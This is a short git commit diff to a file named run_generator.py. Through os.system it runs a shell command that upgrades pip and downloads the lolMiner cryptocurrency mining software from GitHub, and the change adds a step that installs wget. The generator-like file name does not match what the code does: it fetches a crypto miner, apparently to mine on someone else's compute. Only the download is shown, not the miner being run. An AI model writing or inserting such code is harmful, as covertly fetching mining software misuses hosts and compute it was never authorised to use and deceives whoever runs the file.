0c623910dca7a36904c44c889bc64d02bc4c8644
whiteco123 <92229203+whiteco123@users.noreply.github.com>
2021-10-09 22:59:18 +0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,3 @@
 import os
-cmd = 'pip install --upgrade pip & wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz'
+cmd = 'pip install --upgrade pip & apt-get install wget & wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz'
 os.system(cmd)
